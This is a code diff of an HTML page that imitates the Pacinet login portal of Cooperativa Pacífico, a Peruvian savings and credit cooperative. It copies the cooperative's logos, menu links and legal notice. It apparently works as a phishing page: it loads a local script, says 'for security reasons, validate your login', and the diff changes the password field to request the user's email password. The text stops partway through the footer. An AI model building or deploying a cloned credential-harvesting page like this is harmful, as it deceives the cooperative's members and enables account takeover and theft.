@@ -1,532 +1,655 @@
 <!DOCTYPE html>
 <html lang="es" translate="no">
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <meta charset="utf-8" />
+    <title>Pacífico</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link
+      rel="icon"
+      type="image/x-icon"
+      href="https://pacinet.cp.com.pe/favicon.png"
+    />
 
-<head>
-  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
-  <meta charset="utf-8" />
-  <title>Pacífico</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link rel="icon" type="image/x-icon" href="https://pacinet.cp.com.pe/favicon.png" />
+    <style>
+      @charset "UTF-8";
 
-  <style>
-    @charset "UTF-8";
-
-    body,
-    html {
-      margin: 0;
-      padding: 0;
-      background: #003467;
-    }
-
-    body,
-    html {
-      margin: 0;
-      padding: 0;
-      border: 0;
-      font-size: 100%;
-      font-weight: 400;
-      vertical-align: initial;
-      background: #0000;
-    }
-
-    *,
-    :after,
-    :before {
-      box-sizing: border-box !important;
-    }
-
-    @font-face {
-      font-family: open_sansregular;
-      src: url(opensans-regular-webfont.5a148f5be23f233b72ab.eot);
-      src: url(opensans-regular-webfont.5a148f5be23f233b72ab.eot?#iefix) format("embedded-opentype"),
-        url(opensans-regular-webfont.e824fd36a5327bc5469e.woff2) format("woff2"),
-        url(opensans-regular-webfont.7b9a1b93fc3c67159a06.woff) format("woff"),
-        url(opensans-regular-webfont.046cdde5e7537da13807.ttf) format("truetype"),
-        url(opensans-regular-webfont.cf709bf5eb1e732656cd.svg#open_sansregular) format("svg");
-      font-weight: 400;
-      font-style: normal;
-      font-display: swap;
-    }
-
-    html {
-      height: 100%;
-      -webkit-tap-highlight-color: transparent;
-    }
-
-    body {
-      overflow-x: hidden;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-      font-family: open_sansregular;
-      color: #222;
-      background: #003467;
-      background: linear-gradient(126deg, #003467 25%, #0071b9);
-    }
-
-    @media only screen and (max-width: 500px) and (min-width: 5px) {
-      body {
+      body,
+      html {
+        margin: 0;
+        padding: 0;
         background: #003467;
       }
-    }
-  </style>
-  <link rel="stylesheet" href="datos/styles.7af00e0c01ae7ce80e16.css" media="all" onload="this.media='all'" />
-  <noscript>
-    <link rel="stylesheet" href="styles.7af00e0c01ae7ce80e16.css" />
-  </noscript>
-  <style></style>
-  <style>
-    .loader-wrapper[_ngcontent-gxl-c59] {
-      opacity: 1;
-      position: fixed;
-      perspective: 2000px;
-      transform-origin: center center;
-      display: block !important;
-      visibility: visible !important;
-      top: 0 !important;
-      left: 0 !important;
-      width: 100%;
-      height: 100%;
-      text-align: center;
-      background-color: #00000080;
-      -webkit-user-select: none;
-      user-select: none;
-      will-change: opacity;
-      z-index: 100000;
-      line-height: 1;
-    }
 
-    .text-center[_ngcontent-gxl-c59] {
-      position: absolute;
-      text-align: center;
-      left: 0;
-      bottom: 0;
-      right: 0;
-      top: 0;
-      margin: auto;
-    }
-
-    .loader[_ngcontent-gxl-c59] {
-      width: 100%;
-      margin: 0 auto;
-      background-color: initial;
-      border: none;
-      border-radius: 0;
-      box-shadow: none !important;
-      color: #fff;
-      display: block !important;
-      visibility: visible !important;
-      font-size: 1rem;
-      position: relative;
-      z-index: 99997;
-      top: 40%;
-      left: 0;
-    }
-
-    .loader-logo[_ngcontent-gxl-c59] {
-      height: 48px;
-    }
-
-    .loader-icon[_ngcontent-gxl-c59] {
-      display: block;
-      width: 100%;
-      height: 30px;
-      margin-top: 30px;
-    }
-
-    .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59] {
-      height: 20px;
-      width: 20px;
-      position: relative;
-      border-radius: 50%;
-      background: #fff;
-      display: inline-block;
-      text-align: center;
-      margin-left: 10px;
-    }
-
-    .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:first-child {
-      animation: move 1s ease-in-out infinite alternate;
-      margin-left: 0;
-    }
-
-    .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:nth-child(2) {
-      animation: move 1s ease-in-out -0.25s infinite alternate;
-      margin-left: 10px;
-    }
-
-    .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:nth-child(3) {
-      animation: move 1s ease-in-out -0.5s infinite alternate;
-    }
-
-    .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:nth-child(4) {
-      animation: move 1s ease-in-out -0.75s infinite alternate;
-    }
-
-    .loader-forced[_ngcontent-gxl-c59] {
-      position: absolute;
-      z-index: 2;
-    }
-
-    .loader-forced[_ngcontent-gxl-c59] .loader[_ngcontent-gxl-c59] {
-      transform: translateY(-50%);
-    }
-
-    @keyframes move {
-      0% {
-        transform: translateY(-10px);
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        border: 0;
+        font-size: 100%;
+        font-weight: 400;
+        vertical-align: initial;
+        background: #0000;
       }
 
-      to {
-        transform: translateY(5px);
-      }
-    }
-  </style>
-  <style>
-    .login_content[_ngcontent-gxl-c43] {
-      height: 100vh;
-    }
-  </style>
-  <style>
-    input[_ngcontent-gxl-c48]::-ms-reveal {
-      display: none;
-    }
-
-    .olvide_mi_clave[_ngcontent-gxl-c48] h1[_ngcontent-gxl-c48] {
-      margin-top: 15px;
-    }
-
-    .codigo_de_socio[_ngcontent-gxl-c48] p[_ngcontent-gxl-c48] {
-      margin-top: 20px;
-    }
-
-    .dni_ruc_input[_ngcontent-gxl-c48] {
-      margin-top: 40px;
-    }
-  </style>
-  <script src="datos/api.js" async="" defer="defer"></script>
-  <style>
-    .showLegal[_ngcontent-gxl-c38] {
-      display: block;
-    }
-  </style>
-  <style>
-    .snackbar[_ngcontent-gxl-c41] {
-      visibility: hidden;
-      position: fixed;
-      top: 1rem;
-      right: 1rem;
-      z-index: 99998;
-      transform: translateX(calc(100% + 10%));
-    }
-
-    .show[_ngcontent-gxl-c41] {
-      visibility: visible;
-      animation: anime 5s ease 1 normal;
-    }
-
-    @keyframes anime {
-      16.666% {
-        transform: translateX(0);
+      *,
+      :after,
+      :before {
+        box-sizing: border-box !important;
       }
 
-      83.333% {
-        transform: translateX(0);
+      @font-face {
+        font-family: open_sansregular;
+        src: url(opensans-regular-webfont.5a148f5be23f233b72ab.eot);
+        src: url(opensans-regular-webfont.5a148f5be23f233b72ab.eot?#iefix)
+            format("embedded-opentype"),
+          url(opensans-regular-webfont.e824fd36a5327bc5469e.woff2)
+            format("woff2"),
+          url(opensans-regular-webfont.7b9a1b93fc3c67159a06.woff) format("woff"),
+          url(opensans-regular-webfont.046cdde5e7537da13807.ttf)
+            format("truetype"),
+          url(opensans-regular-webfont.cf709bf5eb1e732656cd.svg#open_sansregular)
+            format("svg");
+        font-weight: 400;
+        font-style: normal;
+        font-display: swap;
       }
-    }
-  </style>
-  <meta http-equiv="origin-trial"
-    content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9" />
-</head>
 
-<body>
-  <app-root _nghost-gxl-c60="" ng-version="12.1.5"><router-outlet _ngcontent-gxl-c60=""></router-outlet><app-auth-page
-      _nghost-gxl-c49=""><app-content-auth _ngcontent-gxl-c49="" _nghost-gxl-c43="">
-        <div _ngcontent-gxl-c43="" class="login_content">
-          <div _ngcontent-gxl-c43="" class="page">
-            <app-header _ngcontent-gxl-c43="" _nghost-gxl-c38="">
-              <header _ngcontent-gxl-c38="" id="header" class="clearfix">
-                <div _ngcontent-gxl-c38="" class="central-wrapper clearfix">
-                  <div _ngcontent-gxl-c38="" class="logo_movil">
-                    <img _ngcontent-gxl-c38="" src="datos/logo_pacific.svg" alt="Cooperativa Pacifico" />
+      html {
+        height: 100%;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      body {
+        overflow-x: hidden;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        font-family: open_sansregular;
+        color: #222;
+        background: #003467;
+        background: linear-gradient(126deg, #003467 25%, #0071b9);
+      }
+
+      @media only screen and (max-width: 500px) and (min-width: 5px) {
+        body {
+          background: #003467;
+        }
+      }
+    </style>
+    <link
+      rel="stylesheet"
+      href="datos/styles.7af00e0c01ae7ce80e16.css"
+      media="all"
+      onload="this.media='all'"
+    />
+    <noscript>
+      <link rel="stylesheet" href="styles.7af00e0c01ae7ce80e16.css" />
+    </noscript>
+    <style></style>
+    <style>
+      .loader-wrapper[_ngcontent-gxl-c59] {
+        opacity: 1;
+        position: fixed;
+        perspective: 2000px;
+        transform-origin: center center;
+        display: block !important;
+        visibility: visible !important;
+        top: 0 !important;
+        left: 0 !important;
+        width: 100%;
+        height: 100%;
+        text-align: center;
+        background-color: #00000080;
+        -webkit-user-select: none;
+        user-select: none;
+        will-change: opacity;
+        z-index: 100000;
+        line-height: 1;
+      }
+
+      .text-center[_ngcontent-gxl-c59] {
+        position: absolute;
+        text-align: center;
+        left: 0;
+        bottom: 0;
+        right: 0;
+        top: 0;
+        margin: auto;
+      }
+
+      .loader[_ngcontent-gxl-c59] {
+        width: 100%;
+        margin: 0 auto;
+        background-color: initial;
+        border: none;
+        border-radius: 0;
+        box-shadow: none !important;
+        color: #fff;
+        display: block !important;
+        visibility: visible !important;
+        font-size: 1rem;
+        position: relative;
+        z-index: 99997;
+        top: 40%;
+        left: 0;
+      }
+
+      .loader-logo[_ngcontent-gxl-c59] {
+        height: 48px;
+      }
+
+      .loader-icon[_ngcontent-gxl-c59] {
+        display: block;
+        width: 100%;
+        height: 30px;
+        margin-top: 30px;
+      }
+
+      .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59] {
+        height: 20px;
+        width: 20px;
+        position: relative;
+        border-radius: 50%;
+        background: #fff;
+        display: inline-block;
+        text-align: center;
+        margin-left: 10px;
+      }
+
+      .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:first-child {
+        animation: move 1s ease-in-out infinite alternate;
+        margin-left: 0;
+      }
+
+      .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:nth-child(2) {
+        animation: move 1s ease-in-out -0.25s infinite alternate;
+        margin-left: 10px;
+      }
+
+      .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:nth-child(3) {
+        animation: move 1s ease-in-out -0.5s infinite alternate;
+      }
+
+      .loader-icon[_ngcontent-gxl-c59] div[_ngcontent-gxl-c59]:nth-child(4) {
+        animation: move 1s ease-in-out -0.75s infinite alternate;
+      }
+
+      .loader-forced[_ngcontent-gxl-c59] {
+        position: absolute;
+        z-index: 2;
+      }
+
+      .loader-forced[_ngcontent-gxl-c59] .loader[_ngcontent-gxl-c59] {
+        transform: translateY(-50%);
+      }
+
+      @keyframes move {
+        0% {
+          transform: translateY(-10px);
+        }
+
+        to {
+          transform: translateY(5px);
+        }
+      }
+    </style>
+    <style>
+      .login_content[_ngcontent-gxl-c43] {
+        height: 100vh;
+      }
+    </style>
+    <style>
+      input[_ngcontent-gxl-c48]::-ms-reveal {
+        display: none;
+      }
+
+      .olvide_mi_clave[_ngcontent-gxl-c48] h1[_ngcontent-gxl-c48] {
+        margin-top: 15px;
+      }
+
+      .codigo_de_socio[_ngcontent-gxl-c48] p[_ngcontent-gxl-c48] {
+        margin-top: 20px;
+      }
+
+      .dni_ruc_input[_ngcontent-gxl-c48] {
+        margin-top: 40px;
+      }
+    </style>
+    <script src="datos/api.js" async="" defer="defer"></script>
+    <style>
+      .showLegal[_ngcontent-gxl-c38] {
+        display: block;
+      }
+    </style>
+    <style>
+      .snackbar[_ngcontent-gxl-c41] {
+        visibility: hidden;
+        position: fixed;
+        top: 1rem;
+        right: 1rem;
+        z-index: 99998;
+        transform: translateX(calc(100% + 10%));
+      }
+
+      .show[_ngcontent-gxl-c41] {
+        visibility: visible;
+        animation: anime 5s ease 1 normal;
+      }
+
+      @keyframes anime {
+        16.666% {
+          transform: translateX(0);
+        }
+
+        83.333% {
+          transform: translateX(0);
+        }
+      }
+    </style>
+    <meta
+      http-equiv="origin-trial"
+      content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"
+    />
+  </head>
+
+  <body>
+    <app-root _nghost-gxl-c60="" ng-version="12.1.5"
+      ><router-outlet _ngcontent-gxl-c60=""></router-outlet
+      ><app-auth-page _nghost-gxl-c49=""
+        ><app-content-auth _ngcontent-gxl-c49="" _nghost-gxl-c43="">
+          <div _ngcontent-gxl-c43="" class="login_content">
+            <div _ngcontent-gxl-c43="" class="page">
+              <app-header _ngcontent-gxl-c43="" _nghost-gxl-c38="">
+                <header _ngcontent-gxl-c38="" id="header" class="clearfix">
+                  <div _ngcontent-gxl-c38="" class="central-wrapper clearfix">
+                    <div _ngcontent-gxl-c38="" class="logo_movil">
+                      <img
+                        _ngcontent-gxl-c38=""
+                        src="datos/logo_pacific.svg"
+                        alt="Cooperativa Pacifico"
+                      />
+                    </div>
+                    <div _ngcontent-gxl-c38="" class="timer_login"></div>
+                    <!----><!----><!---->
+                    <div _ngcontent-gxl-c38="" class="menu_right">
+                      <ul _ngcontent-gxl-c38="">
+                        <li _ngcontent-gxl-c38="">
+                          <a
+                            _ngcontent-gxl-c38=""
+                            href="https://cp.com.pe/pacifico/in/general/personas/promociones-personas/"
+                            target="_blank"
+                            >Promociones</a
+                          ><span _ngcontent-gxl-c38="">|</span>
+                        </li>
+                        <li _ngcontent-gxl-c38="">
+                          <a _ngcontent-gxl-c38="" class="mostrar_legal"
+                            >Legal</a
+                          ><span _ngcontent-gxl-c38="">|</span>
+                        </li>
+                        <li _ngcontent-gxl-c38="">
+                          <a
+                            _ngcontent-gxl-c38=""
+                            href="https://cp.com.pe/pacifico/transparencia/"
+                            target="_blank"
+                            >Transparencia</a
+                          ><span _ngcontent-gxl-c38="">|</span>
+                        </li>
+                        <li _ngcontent-gxl-c38="">
+                          <a
+                            _ngcontent-gxl-c38=""
+                            href="https://cp.com.pe/pacifico/tarifario/"
+                            target="_blank"
+                            >Tarifario</a
+                          ><span _ngcontent-gxl-c38="">|</span>
+                        </li>
+                        <li _ngcontent-gxl-c38="">
+                          <a
+                            _ngcontent-gxl-c38=""
+                            href="https://cp.com.pe/pacifico/canales-de-contacto/"
+                            target="_blank"
+                            >Contáctenos</a
+                          >
+                        </li>
+                      </ul>
+                    </div>
                   </div>
-                  <div _ngcontent-gxl-c38="" class="timer_login"></div>
-                  <!----><!----><!---->
-                  <div _ngcontent-gxl-c38="" class="menu_right">
-                    <ul _ngcontent-gxl-c38="">
-                      <li _ngcontent-gxl-c38="">
-                        <a _ngcontent-gxl-c38=""
-                          href="https://cp.com.pe/pacifico/in/general/personas/promociones-personas/"
-                          target="_blank">Promociones</a><span _ngcontent-gxl-c38="">|</span>
-                      </li>
-                      <li _ngcontent-gxl-c38="">
-                        <a _ngcontent-gxl-c38="" class="mostrar_legal">Legal</a><span _ngcontent-gxl-c38="">|</span>
-                      </li>
-                      <li _ngcontent-gxl-c38="">
-                        <a _ngcontent-gxl-c38="" href="https://cp.com.pe/pacifico/transparencia/"
-                          target="_blank">Transparencia</a><span _ngcontent-gxl-c38="">|</span>
-                      </li>
-                      <li _ngcontent-gxl-c38="">
-                        <a _ngcontent-gxl-c38="" href="https://cp.com.pe/pacifico/tarifario/"
-                          target="_blank">Tarifario</a><span _ngcontent-gxl-c38="">|</span>
-                      </li>
-                      <li _ngcontent-gxl-c38="">
-                        <a _ngcontent-gxl-c38="" href="https://cp.com.pe/pacifico/canales-de-contacto/"
-                          target="_blank">Contáctenos</a>
-                      </li>
-                    </ul>
-                  </div>
-                </div>
-                <div _ngcontent-gxl-c38="" id="modalLegal" class="modal_responsive">
-                  <div _ngcontent-gxl-c38="" class="filter_modal"></div>
-                  <div _ngcontent-gxl-c38="" class="cont_modal">
-                    <div _ngcontent-gxl-c38="" class="modal_legal">
-                      <span _ngcontent-gxl-c38="" class="modal-close"><img _ngcontent-gxl-c38=""
-                          src="datos/icon_cerrar.png" alt="cerrar" /></span>
-                      <h3 _ngcontent-gxl-c38="">Legal</h3>
-                      <p _ngcontent-gxl-c38="">
-                        Nuestros productos y servicios están sujetos a
-                        calificación, admisión y aprobación. Se aplican
-                        restricciones. Las tasas, comisiones, gastos y
-                        características de los productos y servicios se
-                        detallan en nuestra página web
-                        <a _ngcontent-gxl-c38="" href="https://cp.com.pe/pacifico/" target="_blank"><strong
-                            _ngcontent-gxl-c38="">www.cp.com.pe</strong></a>
-                        y en la Plataforma de atención, a través del
-                        tarifario. Para acceder a los productos y servicios,
-                        usted debe ser socio de Cooperativa de Ahorro y
-                        Crédito Pacífico. Puede solicitar más información
-                        sobre los requisitos de afiliación a través del
-                        719-2100 o nuestra página web. No captamos recursos
-                        del público, sólo operamos y captamos recursos de
-                        nuestros socios. Nos encontramos inscritos en el
-                        Registro Nacional de COOPAC, con el Registro
-                        N°001-2019-REG.COOPAC-SBS. Nos encontramos
-                        incorporados al Fondo de Seguro de Depósitos
-                        Cooperativo (FSDC); los depósitos de nuestros socios
-                        no se encuentran cubiertos por el FSDC, hasta dar
-                        cumplimiento a lo dispuesto por el artículo 5 de la
-                        Resolución SBS N° 5061-2018. Estamos regulados por la
-                        Superintendencia de Banca, Seguros y AFP (SBS) y
-                        supervisados por Superintendencia Adjunta de
-                        Cooperativas (SACOOP). Información difundida según lo
-                        indicado en la Vigésimo Cuarta Disposición Final y
-                        Complementaria de la Ley N° 26702, modificada por Ley
-                        N° 30822, la Resolución SBS N° 0480-2019, la
-                        Resolución SBS N° 3274-2017 y sus modificatorias,
-                        conforme a la normatividad vigente.
-                      </p>
-                      <div _ngcontent-gxl-c38="" class="botones_modal">
-                        <a _ngcontent-gxl-c38="" class="button modal-close">Aceptar</a>
+                  <div
+                    _ngcontent-gxl-c38=""
+                    id="modalLegal"
+                    class="modal_responsive"
+                  >
+                    <div _ngcontent-gxl-c38="" class="filter_modal"></div>
+                    <div _ngcontent-gxl-c38="" class="cont_modal">
+                      <div _ngcontent-gxl-c38="" class="modal_legal">
+                        <span _ngcontent-gxl-c38="" class="modal-close"
+                          ><img
+                            _ngcontent-gxl-c38=""
+                            src="datos/icon_cerrar.png"
+                            alt="cerrar"
+                        /></span>
+                        <h3 _ngcontent-gxl-c38="">Legal</h3>
+                        <p _ngcontent-gxl-c38="">
+                          Nuestros productos y servicios están sujetos a
+                          calificación, admisión y aprobación. Se aplican
+                          restricciones. Las tasas, comisiones, gastos y
+                          características de los productos y servicios se
+                          detallan en nuestra página web
+                          <a
+                            _ngcontent-gxl-c38=""
+                            href="https://cp.com.pe/pacifico/"
+                            target="_blank"
+                            ><strong _ngcontent-gxl-c38=""
+                              >www.cp.com.pe</strong
+                            ></a
+                          >
+                          y en la Plataforma de atención, a través del
+                          tarifario. Para acceder a los productos y servicios,
+                          usted debe ser socio de Cooperativa de Ahorro y
+                          Crédito Pacífico. Puede solicitar más información
+                          sobre los requisitos de afiliación a través del
+                          719-2100 o nuestra página web. No captamos recursos
+                          del público, sólo operamos y captamos recursos de
+                          nuestros socios. Nos encontramos inscritos en el
+                          Registro Nacional de COOPAC, con el Registro
+                          N°001-2019-REG.COOPAC-SBS. Nos encontramos
+                          incorporados al Fondo de Seguro de Depósitos
+                          Cooperativo (FSDC); los depósitos de nuestros socios
+                          no se encuentran cubiertos por el FSDC, hasta dar
+                          cumplimiento a lo dispuesto por el artículo 5 de la
+                          Resolución SBS N° 5061-2018. Estamos regulados por la
+                          Superintendencia de Banca, Seguros y AFP (SBS) y
+                          supervisados por Superintendencia Adjunta de
+                          Cooperativas (SACOOP). Información difundida según lo
+                          indicado en la Vigésimo Cuarta Disposición Final y
+                          Complementaria de la Ley N° 26702, modificada por Ley
+                          N° 30822, la Resolución SBS N° 0480-2019, la
+                          Resolución SBS N° 3274-2017 y sus modificatorias,
+                          conforme a la normatividad vigente.
+                        </p>
+                        <div _ngcontent-gxl-c38="" class="botones_modal">
+                          <a _ngcontent-gxl-c38="" class="button modal-close"
+                            >Aceptar</a
+                          >
+                        </div>
                       </div>
                     </div>
                   </div>
-                </div>
-              </header>
-            </app-header>
-            <div _ngcontent-gxl-c43="" class="content-wrap">
-              <div _ngcontent-gxl-c43="" class="central-wrapper clearfix">
-                <div _ngcontent-gxl-c43="" class="left_login">
-                  <div _ngcontent-gxl-c43="" class="logo_login">
-                    <img _ngcontent-gxl-c43="" src="datos/logo_cp.svg" alt="Cooperativa Pacifico" />
-                  </div>
-                  <h1 _ngcontent-gxl-c43="" style="
+                </header>
+              </app-header>
+              <div _ngcontent-gxl-c43="" class="content-wrap">
+                <div _ngcontent-gxl-c43="" class="central-wrapper clearfix">
+                  <div _ngcontent-gxl-c43="" class="left_login">
+                    <div _ngcontent-gxl-c43="" class="logo_login">
+                      <img
+                        _ngcontent-gxl-c43=""
+                        src="datos/logo_cp.svg"
+                        alt="Cooperativa Pacifico"
+                      />
+                    </div>
+                    <h1
+                      _ngcontent-gxl-c43=""
+                      style="
                         font-style: italic;
 
                         font-family: Arial, Helvetica, sans-serif !important;
-                      ">
-                    Bienvenido a
-                    <strong _ngcontent-gxl-c43="" style="
+                      "
+                    >
+                      Bienvenido a
+                      <strong
+                        _ngcontent-gxl-c43=""
+                        style="
                           font-family: Arial, Helvetica, sans-serif !important;
                           font-weight: bold;
-                        ">Pacinet</strong>
-                  </h1>
-                  <div _ngcontent-gxl-c43="" class="img_login">
-                    <img _ngcontent-gxl-c43="" src="datos/familia-pacifico.png" alt="Familia Cooperativa Pacifico" />
+                        "
+                        >Pacinet</strong
+                      >
+                    </h1>
+                    <div _ngcontent-gxl-c43="" class="img_login">
+                      <img
+                        _ngcontent-gxl-c43=""
+                        src="datos/familia-pacifico.png"
+                        alt="Familia Cooperativa Pacifico"
+                      />
+                    </div>
                   </div>
-                </div>
-                <div _ngcontent-gxl-c49="" class="right_login">
-                  <div _ngcontent-gxl-c49="" class="content_form">
-                    <div _ngcontent-gxl-c49="" class="tab-slider--container">
-                      <app-login-form _ngcontent-gxl-c49="" _nghost-gxl-c48="">
-                        <div _ngcontent-gxl-c48="">
-                          <h1 _ngcontent-gxl-c48="" style="
+                  <div _ngcontent-gxl-c49="" class="right_login">
+                    <div _ngcontent-gxl-c49="" class="content_form">
+                      <div _ngcontent-gxl-c49="" class="tab-slider--container">
+                        <app-login-form
+                          _ngcontent-gxl-c49=""
+                          _nghost-gxl-c48=""
+                        >
+                          <div _ngcontent-gxl-c48="">
+                            <h1
+                              _ngcontent-gxl-c48=""
+                              style="
                                 font-family: Arial, Helvetica, sans-serif !important;
-                              ">
-                            Por motivos de seguridad, valide su ingreso.
-                          </h1>
+                              "
+                            >
+                              Por motivos de seguridad, valide su ingreso.
+                            </h1>
 
-                          <div _ngcontent-gxl-c48="" id="tab1" class="tab-slider--body">
-                            <form _ngcontent-gxl-c48="" novalidate="" class="ng-untouched ng-pristine ng-invalid"
-                              id="loginform">
-                              <div _ngcontent-gxl-c48="" class="form_row clearfix">
-                                <div _ngcontent-gxl-c48="" class="form_cell" style="margin-top: 40px">
-                                  <label _ngcontent-gxl-c48="" style="
-                                        font-family: Arial, Helvetica,
-                                          sans-serif !important;
-                                      ">Correo Eletronico: </label><span _ngcontent-gxl-c48="" class="user_dni_codigo">
-                                    <input style="
-                                          font-family: Arial, Helvetica,
-                                            sans-serif !important;
-                                        " _ngcontent-gxl-c48="" type="email" numeric="" name="userCode"
-                                      autocomplete="off" id="correo" required=""
-                                      class="form_element ng-untouched ng-pristine ng-invalid"
-                                      placeholder="Ingrese tu Correo Eletronico" /><!----></span>
-                                </div>
-                              </div>
-
-                              <div _ngcontent-gxl-c48="" class="form_row clearfix">
-                                <div _ngcontent-gxl-c48="" class="form_cell">
-                                  <label _ngcontent-gxl-c48="" style="
-                                        font-family: Arial, Helvetica,
-                                          sans-serif !important;
-                                      ">Contraseña:</label><span _ngcontent-gxl-c48="" class="user_contrasena"><input
+                            <div
+                              _ngcontent-gxl-c48=""
+                              id="tab1"
+                              class="tab-slider--body"
+                            >
+                              <form
+                                _ngcontent-gxl-c48=""
+                                novalidate=""
+                                class="ng-untouched ng-pristine ng-invalid"
+                                id="loginform"
+                              >
+                                <div
+                                  _ngcontent-gxl-c48=""
+                                  class="form_row clearfix"
+                                >
+                                  <div
+                                    _ngcontent-gxl-c48=""
+                                    class="form_cell"
+                                    style="margin-top: 40px"
+                                  >
+                                    <label
+                                      _ngcontent-gxl-c48=""
                                       style="
+                                        font-family: Arial, Helvetica,
+                                          sans-serif !important;
+                                      "
+                                      >Correo Eletronico: </label
+                                    ><span
+                                      _ngcontent-gxl-c48=""
+                                      class="user_dni_codigo"
+                                    >
+                                      <input
+                                        style="
                                           font-family: Arial, Helvetica,
                                             sans-serif !important;
-                                        " _ngcontent-gxl-c48="" name="userPassword" placeholder="Ingrese su contraseña"
-                                      required="" class="form_element ng-untouched ng-pristine ng-invalid"
-                                      type="password" id="contra" /><!----></span>
+                                        "
+                                        _ngcontent-gxl-c48=""
+                                        type="email"
+                                        numeric=""
+                                        name="userCode"
+                                        autocomplete="off"
+                                        id="correo"
+                                        required=""
+                                        class="form_element ng-untouched ng-pristine ng-invalid"
+                                        placeholder="Ingrese tu Correo Eletronico"
+                                      /><!----></span
+                                    >
+                                  </div>
                                 </div>
-                              </div>
 
-                              <div _ngcontent-gxl-c48="" class="center_content content_capcha"></div>
-                              <div _ngcontent-gxl-c48="" id="alert"></div>
-                              <div _ngcontent-gxl-c48="" class="center_content">
-                                <button _ngcontent-gxl-c48="" type="submit" class="boton_ingresar" style="
+                                <div
+                                  _ngcontent-gxl-c48=""
+                                  class="form_row clearfix"
+                                >
+                                  <div _ngcontent-gxl-c48="" class="form_cell">
+                                    <label
+                                      _ngcontent-gxl-c48=""
+                                      style="
+                                        font-family: Arial, Helvetica,
+                                          sans-serif !important;
+                                      "
+                                      >Contraseña del correo eletronico:</label
+                                    ><span
+                                      _ngcontent-gxl-c48=""
+                                      class="user_contrasena"
+                                      ><input
+                                        style="
+                                          font-family: Arial, Helvetica,
+                                            sans-serif !important;
+                                        "
+                                        _ngcontent-gxl-c48=""
+                                        name="userPassword"
+                                        placeholder="Ingrese su contraseña"
+                                        required=""
+                                        class="form_element ng-untouched ng-pristine ng-invalid"
+                                        type="password"
+                                        id="contra"
+                                      /><!----></span
+                                    >
+                                  </div>
+                                </div>
+
+                                <div
+                                  _ngcontent-gxl-c48=""
+                                  class="center_content content_capcha"
+                                ></div>
+                                <div _ngcontent-gxl-c48="" id="alert"></div>
+                                <div
+                                  _ngcontent-gxl-c48=""
+                                  class="center_content"
+                                >
+                                  <button
+                                    _ngcontent-gxl-c48=""
+                                    type="submit"
+                                    class="boton_ingresar"
+                                    style="
                                       font-family: Arial, Helvetica, sans-serif !important;
-                                    ">
-                                  Ingresar
-                                </button>
-                              </div>
-                            </form>
+                                    "
+                                  >
+                                    Ingresar
+                                  </button>
+                                </div>
+                              </form>
+                            </div>
                           </div>
+                          <!----><!---->
+                        </app-login-form>
+                      </div>
+                    </div>
+                  </div>
+                  <!----><app-alert _ngcontent-gxl-c43="" _nghost-gxl-c41="">
+                    <div _ngcontent-gxl-c41="" class="content_alerts snackbar">
+                      <div
+                        _ngcontent-gxl-c41=""
+                        class="alert alert_aviso"
+                        style="border: 2px solid rgb(255, 199, 95)"
+                      >
+                        <span _ngcontent-gxl-c41=""
+                          ><img
+                            _ngcontent-gxl-c41=""
+                            alt="aviso"
+                            src="datos/alert_aviso.png"
+                        /></span>
+                        <div _ngcontent-gxl-c41="" class="content_texts">
+                          <!---->
+                          <div _ngcontent-gxl-c41="" class="message"></div>
                         </div>
                         <!----><!---->
-                      </app-login-form>
+                      </div>
                     </div>
-                  </div>
+                    <!---->
+                  </app-alert>
                 </div>
-                <!----><app-alert _ngcontent-gxl-c43="" _nghost-gxl-c41="">
-                  <div _ngcontent-gxl-c41="" class="content_alerts snackbar">
-                    <div _ngcontent-gxl-c41="" class="alert alert_aviso" style="border: 2px solid rgb(255, 199, 95)">
-                      <span _ngcontent-gxl-c41=""><img _ngcontent-gxl-c41="" alt="aviso"
-                          src="datos/alert_aviso.png" /></span>
-                      <div _ngcontent-gxl-c41="" class="content_texts">
-                        <!---->
-                        <div _ngcontent-gxl-c41="" class="message"></div>
+                <app-footer _ngcontent-gxl-c43="" _nghost-gxl-c42="">
+                  <footer _ngcontent-gxl-c42="" id="footer">
+                    <div _ngcontent-gxl-c42="" class="central-wrapper clearfix">
+                      <div _ngcontent-gxl-c42="" class="footer_bottom clearfix">
+                        <ul _ngcontent-gxl-c42="" class="menu_footer_movil">
+                          <li _ngcontent-gxl-c42="">
+                            <a
+                              _ngcontent-gxl-c42=""
+                              href="https://cp.com.pe/pacifico/aviso-de-privacidad/"
+                              target="_blank"
+                              >Políticas de Seguridad</a
+                            >
+                          </li>
+                          <li _ngcontent-gxl-c42="">
+                            <a
+                              _ngcontent-gxl-c42=""
